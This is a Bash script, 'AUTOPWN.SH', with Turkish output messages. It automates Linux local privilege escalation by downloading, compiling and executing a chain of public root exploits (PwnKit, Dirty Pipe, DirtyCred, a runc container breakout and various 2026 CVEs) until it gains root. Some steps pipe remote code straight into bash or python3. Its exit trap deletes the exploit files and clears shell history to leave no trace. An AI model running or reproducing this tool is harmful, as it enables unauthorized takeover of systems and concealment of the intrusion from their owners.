#!/bin/bash
# ============================================
#    AUTOPWN.SH - ABSOLUTE FULL & ULTIMATE EDITION
# ============================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

cleanup() {
    echo -e "\n${YELLOW}[*] Temizlik yapiliyor: Tum gecici dosya ve dizinler temizleniyor...${NC}"
    rm -rf /tmp/CVE-* /tmp/dirty* /tmp/pwn* /tmp/gameover* /tmp/pocs /tmp/Dirty* /tmp/cve-* /tmp/cybermeowfia /tmp/tontou* /tmp/OVSwrap /tmp/runc-breakout /tmp/*.zip 2>/dev/null
    history -c 2>/dev/null
    echo -e "${GREEN}[+] Sistem tertemiz birakildi.${NC}"
}

trap cleanup EXIT INT TERM

check_root() {
    if [ "$EUID" -eq 0 ]; then
        echo -e "\n${GREEN}"
        echo "##################################################"
        echo "#                                                #"
        echo "#   [+] MUTLAK BASARI! ROOT YETKISI ELDE EDILDI! #"
        echo "#   [+] Mevcut Kullanici: $(whoami)                  #"
        echo "#                                                #"
        echo "##################################################"
        echo -e "${NC}"
        exit 0
    fi
}

smart_download() {
    local repo_url="$1"
    local target_dir="$2"
    
    rm -rf "$target_dir"
    mkdir -p "$target_dir"
    
    echo -e "${YELLOW}[+] İndiriliyor (Git deneniyor): $repo_url${NC}"
    if command -v git &> /dev/null && git clone --quiet "$repo_url" "$target_dir" 2>/dev/null; then
        return 0
    fi
    
    echo -e "${YELLOW}[!] Git başarısız, Curl/Wget ile ZIP indiriliyor...${NC}"
    local zip_url="${repo_url%.git}/archive/refs/heads/main.zip"
    local alt_zip_url="${repo_url%.git}/archive/refs/heads/master.zip"
    
    if command -v curl &> /dev/null; then
        curl -fsSL "$zip_url" -o /tmp/repo.zip 2>/dev/null || curl -fsSL "$alt_zip_url" -o /tmp/repo.zip 2>/dev/null
    elif command -v wget &> /dev/null; then
        wget -q "$zip_url" -O /tmp/repo.zip 2>/dev/null || wget -q "$alt_zip_url" -O /tmp/repo.zip 2>/dev/null
    fi
    
    if [ -f /tmp/repo.zip ] && command -v unzip &> /dev/null; then
        unzip -q /tmp/repo.zip -d /tmp/ 2>/dev/null
        local extracted_dir=$(unzip -qql /tmp/repo.zip | head -n1 | awk '{print $4}' | cut -d/ -f1)
        if [ -d "/tmp/$extracted_dir" ]; then
            mv "/tmp/$extracted_dir" "$target_dir"
            rm -f /tmp/repo.zip
            return 0
        fi
    fi
    
    rm -f /tmp/repo.zip
    return 1
}

clear
echo -e "${CYAN}"
echo "╔══════════════════════════════════════════════════╗"
echo "║          AUTOPWN.SH - ABSOLUTE FULL EDITION      ║"
echo "║     All Provided Exploits & Zero-Footprint       ║"
echo "╚══════════════════════════════════════════════════╝"
echo -e "${NC}"

echo -e "${BLUE}[*] Mevcut Kullanici Bilgisi:${NC}"
whoami
id
echo ""

echo -e "${YELLOW}[*] Sistem hızlı ön keşfi yapılıyor...${NC}"
echo -n "[-] Kritik SUID Dosyaları (Özet): " && find /usr/bin /usr/sbin /bin /sbin -perm -4000 -type f 2>/dev/null | wc -l
echo -n "[-] Sudo Hakları: " && (sudo -n l 2>/dev/null && echo "Var (Parolasız!)" || echo "Yok / Parola Gerekli")
echo ""

cd /tmp || exit

# ============================================
#       1. KESIN CALISAN (LEGACY & PROVEN)
# ============================================
echo -e "${CYAN}--------------------------------------------------${NC}"
echo -e "${YELLOW}[+] PwnKit (CVE-2021-4034) deneniyor...${NC}"
echo -e "${CYAN}--------------------------------------------------${NC}"
rm -rf /tmp/CVE-2021-4034 /tmp/pwn.c /tmp/pwn
curl -fsSL https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/refs/heads/main/cve-2021-4034-poc.c -o /tmp/pwn.c
gcc /tmp/pwn.c -o /tmp/pwn && /tmp/pwn
check_root

echo -e "${CYAN}--------------------------------------------------${NC}"
echo -e "${YELLOW}[+] Dirty Pipe (CVE-2022-0847) deneniyor...${NC}"
echo -e "${CYAN}--------------------------------------------------${NC}"
smart_download "https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit.git" "/tmp/dirtypipe"
cd /tmp/dirtypipe && gcc exploit.c -o exploit && ./exploit
check_root

echo -e "${CYAN}--------------------------------------------------${NC}"
echo -e "${YELLOW}[+] GameOver(lay) (CVE-2023-2640 + CVE-2023-32629) deneniyor...${NC}"
echo -e "${CYAN}--------------------------------------------------${NC}"
curl -fsSL https://raw.githubusercontent.com/g1vi/CVE-2023-2640-CVE-2023-32629/main/exploit.sh -o /tmp/gameover.sh
chmod +x /tmp/gameover.sh && /tmp/gameover.sh
check_root

# ============================================
#       2. KERNEL'E BAGLI & YENI CVE'LER
# ============================================
echo -e "${CYAN}--------------------------------------------------${NC}"
echo -e "${YELLOW}[+] Dirty Cred deneniyor...${NC}"
echo -e "${CYAN}--------------------------------------------------${NC}"
smart_download "https://github.com/PR0fix/DirtyCred.git" "/tmp/dirtycred"
cd /tmp/dirtycred && make && ./exploit
check_root

echo -e "${CYAN}--------------------------------------------------${NC}"
echo -e "${YELLOW}[+] DirtyFrag deneniyor...${NC}"
echo -e "${CYAN}--------------------------------------------------${NC}"
smart_download "https://github.com/V4bel/dirtyfrag.git" "/tmp/dirtyfrag"
cd /tmp/dirtyfrag && gcc -O0 -Wall -o exp exp.c -lutil && ./exp
check_root

echo -e "${CYAN}--------------------------------------------------${NC}"
echo -e "${YELLOW}[+] FragNesia deneniyor...${NC}"
echo -e "${CYAN}--------------------------------------------------${NC}"
smart_download "https://github.com/v12-security/pocs.git" "/tmp/pocs"
cd /tmp/pocs/fragnesia && gcc -o exp fragnesia.c && ./exp
check_root

echo -e "${CYAN}--------------------------------------------------${NC}"
echo -e "${YELLOW}[+] TONTOU (Spectre v2 bypass) deneniyor...${NC}"
echo -e "${CYAN}--------------------------------------------------${NC}"
rm -rf /tmp/tontou-main /tmp/tontou.zip
wget -q https://github.com/CSAIL-Arch-Sec/tontou/archive/refs/heads/main.zip -O /tmp/tontou.zip
unzip -o /tmp/tontou.zip -d /tmp
cd /tmp/tontou-main && make && ./tontou
check_root

echo -e "${CYAN}--------------------------------------------------${NC}"
echo -e "${YELLOW}[+] CVE-2026-46215 deneniyor...${NC}"
echo -e "${CYAN}--------------------------------------------------${NC}"
smart_download "https://github.com/bluedragonsecurity/CVE-2026-46215-exploit-linux-7.0-uaf-stable.git" "/tmp/CVE-2026-46215"
cd /tmp/CVE-2026-46215 && gcc -o exploit exploit.c -lpthread -static && ./exploit
check_root

# ============================================
#       3. SERVIS BAZLI & KONTEYNER
# ============================================
echo -e "${CYAN}--------------------------------------------------${NC}"
echo -e "${YELLOW}[+] Polkit / DBus LPE (CVE-2021-3560) deneniyor...${NC}"
echo -e "${CYAN}--------------------------------------------------${NC}"
smart_download "https://github.com/cybersecurityworks/CVE-2021-3560-Exploit-POC.git" "/tmp/cve-2021-3560"
cd /tmp/cve-2021-3560 && python3 cve-2021-3560.py
check_root

echo -e "${CYAN}--------------------------------------------------${NC}"
echo -e "${YELLOW}[+] runc Container Breakout deneniyor...${NC}"
echo -e "${CYAN}--------------------------------------------------${NC}"
smart_download "https://github.com/snyk/CVE-2024-21626-PoC.git" "/tmp/runc-breakout"
cd /tmp/runc-breakout && ./exploit.sh
check_root

echo -e "${CYAN}--------------------------------------------------${NC}"
echo -e "${YELLOW}[+] OVSwrap deneniyor...${NC}"
echo -e "${CYAN}--------------------------------------------------${NC}"
smart_download "https://github.com/manizada/OVSwrap.git" "/tmp/OVSwrap"
cd /tmp/OVSwrap && python3 ovswrap-poc.py
check_root

# ============================================
#       4. BELIRSIZ / YENI CVE'LER VE EK SCRIPTLER
# ============================================
echo -e "${CYAN}--------------------------------------------------${NC}"
echo -e "${YELLOW}[+] CVE-2026-31431 deneniyor...${NC}"
echo -e "${CYAN}--------------------------------------------------${NC}"
rm -rf /tmp/CVE-2026-31431-main /tmp/cve31431.zip
wget -q https://github.com/JuanBindez/CVE-2026-31431/archive/refs/heads/main.zip -O /tmp/cve31431.zip
unzip -o /tmp/cve31431.zip -d /tmp
cd /tmp/CVE-2026-31431-main && python3 main.py
check_root

echo -e "${CYAN}--------------------------------------------------${NC}"
echo -e "${YELLOW}[+] CVE-2026-46300 deneniyor...${NC}"
echo -e "${CYAN}--------------------------------------------------${NC}"
smart_download "https://github.com/ExploitEoom/CVE-2026-46300.git" "/tmp/CVE-2026-46300"
cd /tmp/CVE-2026-46300 && chmod +x exploit && ./exploit
check_root

echo -e "${CYAN}--------------------------------------------------${NC}"
echo -e "${YELLOW}[+] CyberMeowfia (openSUSE CVE-2026-43502) deneniyor...${NC}"
echo -e "${CYAN}--------------------------------------------------${NC}"
curl -s https://raw.githubusercontent.com/NebuSec/CyberMeowfia/main/security-research/Linux-CVE-2026-43502-openSUSE-6.4.0-150600/exploit.sh | bash
check_root

# ============================================
#       5. EKSTRA TARAMA VE ÖZEL REPOLAR
# ============================================
echo -e "${CYAN}--------------------------------------------------${NC}"
echo -e "${YELLOW}[+] copy.fail/exp denemesi yapılıyor...${NC}"
echo -e "${CYAN}--------------------------------------------------${NC}"
curl -s https://copy.fail/exp | python3 || true
check_root

echo -e "${CYAN}--------------------------------------------------${NC}"
echo -e "${YELLOW}[+] CVE-2026-68138 (RtabRace - Derleme varyasyonları) deneniyor...${NC}"
echo -e "${CYAN}--------------------------------------------------${NC}"
smart_download "https://github.com/aramosf/CVE-2026-68138.git" "/tmp/CVE-2026-68138"
cd /tmp/CVE-2026-68138 && ./build.sh && ./build/exploit 2>/dev/null || gcc -O2 -static -pthread -Wall -Wextra -Werror -o exploit exploit.c && chmod +x exploit && ./exploit
check_root

echo -e "${CYAN}--------------------------------------------------${NC}"
echo -e "${YELLOW}[+] CVE-2026-68398 (Derleme varyasyonları) deneniyor...${NC}"
echo -e "${CYAN}--------------------------------------------------${NC}"
smart_download "https://github.com/aramosf/cve-2026-68398.git" "/tmp/cve-2026-68398"
cd /tmp/cve-2026-68398 && make && ./build/CVE-2026-68398 auto 60 2>/dev/null || gcc -O2 exploit.c kaslr_prefetch.c -o exploit -lpthread && ./exploit
check_root

echo -e "${CYAN}--------------------------------------------------${NC}"
echo -e "${YELLOW}[+] DirtyDecrypt (CVE-2026-31635) deneniyor...${NC}"
echo -e "${CYAN}--------------------------------------------------${NC}"
smart_download "https://github.com/0xBlackash/DirtyDecrypt.git" "/tmp/DirtyDecrypt"
cd /tmp/DirtyDecrypt && gcc -O2 -static -pthread CVE-2026-31635.c -o DirtyDecrypt && ./DirtyDecrypt
check_root

echo -e "${CYAN}--------------------------------------------------${NC}"
echo -e "${YELLOW}[+] CyberMeowfia (RHEL CVE-2026-52923) deneniyor...${NC}"
echo -e "${CYAN}--------------------------------------------------${NC}"
smart_download "https://github.com/NebuSec/CyberMeowfia.git" "/tmp/cybermeowfia"
cd /tmp/cybermeowfia/security-research/Linux-CVE-2026-52923-RHEL-6.12.0-211.7.3.el10_2 && make && ./exploit
check_root

echo -e "${CYAN}--------------------------------------------------${NC}"
echo -e "${YELLOW}[+] Alternatif PwnKit denemesi yapılıyor...${NC}"
echo -e "${CYAN}--------------------------------------------------${NC}"
smart_download "https://github.com/Rvn0xsy/CVE-2021-4034.git" "/tmp/Rvn0xsy-PwnKit"
cd /tmp/Rvn0xsy-PwnKit && gcc cve-2021-4034.c -o exp && ./exp
check_root

echo -e "${CYAN}--------------------------------------------------${NC}"
echo -e "${YELLOW}[+] PackageKit (CVE-2026-41651) kontrol ediliyor...${NC}"
echo -e "${CYAN}--------------------------------------------------${NC}"
if dpkg -l 2>/dev/null | grep -qi packagekit; then
    smart_download "https://github.com/Vozec/CVE-2026-41651.git" "/tmp/CVE-2026-41651"
    cd /tmp/CVE-2026-41651 && chmod +x cve-2026-41651 && ./cve-2026-41651
    check_root
else
    echo -e "${RED}[-] PackageKit sistemde bulunamadi.${NC}"
fi

echo -e "\n${RED}[*] Tum denemeler tamamlandi (Root elde edilemedi).${NC}"
